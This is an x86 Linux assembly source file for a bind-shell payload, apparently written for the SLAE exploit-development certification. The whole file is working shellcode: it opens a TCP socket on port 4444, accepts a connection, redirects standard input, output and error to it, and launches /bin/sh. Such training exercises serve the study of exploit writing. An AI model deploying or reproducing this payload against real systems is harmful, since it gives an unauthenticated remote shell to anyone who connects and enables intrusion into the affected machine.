; Filename: bind-shell.nasm
; 
; This blog post has been created for cmpleting the requirements of the
; SecurityTube Linux Assembly Expert certiication:
; http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/	
;
; Student ID: SLAE-1537	


global _start			

section .text
_start:


	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx


	; For int socket(int domain, int type, int protocol);
	mov al, 0x66		; syscall number
	mov bl, 0x1		; socket call number

	;push socket arguments from right to left
	push ecx		; push 0 for protocal
	push ebx		; push 1 for type which is SOCK_STREAM
	push 0x2		; push 2 for domain which is AF_INET
	mov ecx, esp		; save socket arguments pointer in ecx
	int 0x80		; make the interrupt to execute the socketcall

	mov esi, eax		; save the socket descriptor(return value from previous call) in esi



	; For int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	mov al, 0x66		; syscall number
	mov bl, 0x2		; bind call number

	; push bind arguments from right to left
	; sockaddr is a struct that has three elements: sin_family, sin_port and sin_addr.s_addr
	; we will need to push the values of the struct from right to left and save a pointer to the first element
	
	xor ecx, ecx
	push ecx		; push 0 for sin_addr.s_addr which is INADDRY_ANY 
	push word 0x5c11	; push the reversed hex value of 4444 for sin_port
	push bx		; push 2 for sin_family which is AF_INET
	mov ecx, esp		; save a pointer to struct values in ecx

	; Now we start preparing bind() argumnets
	push 0x10		; push 16 for addrlen (size of the struct)
	push ecx		; push the pointer to the struct values *addr
	push esi		; push the socket descriptor for sockfd
	mov ecx, esp		; save pointer to bind() arguments in ecx
	int 0x80



	; for int listen(int sockfd, int backlog);
        mov al, 0x66            ; syscall number
        mov bl, 0x4             ; listen call number

	; push listen() arguments from right to left
	xor ecx, ecx		
	push ecx		; push 0 for backlog
	push esi		; push the socket descriptor for sockfd
	mov ecx, esp            ; save pointer to listen() arguments in ecx
	int 0x80 



	; For int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
        mov al, 0x66            ; syscall number
        mov bl, 0x5             ; accept call number

	; push accept() arguments from right to left
	xor ecx, ecx
	push ecx		; push null for *addrlen
	push ecx		; push null for *addr
	push esi		; push the socket descriptor for sockfd
	mov ecx, esp            ; save pointer to listen() arguments in ecx
        int 0x80

	mov ebx, eax		; save the client descriptor(return value from previous call) in ebx to beused
				; as the first argument in the next call


	
	; For int dup2(int oldfd, int newfd);
	xor eax, eax
	xor ecx, ecx
	mov cl, 0x2
loop:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns loop 



	; For int execve(const char *filename, char *const argv[], char *const envp[]);
	xor eax, eax
	mov al, 0xb		; execve call number

	; prepare a pointer to the string of the first argument
	xor ecx, ecx
	push ecx		; for null terminator of the string
	push 0x68732f2f		; push hs//
	push 0x6e69622f		; push nib/
	mov ebx, esp		; save string pointer in ebx (first param)

	push ecx		; push null
	mov edx, esp		; make edx point to null(third param)

	push ebx		; push the string address(first param)
	mov ecx, esp		; make ecx point to the pointer of the string(second param)

	int 0x80



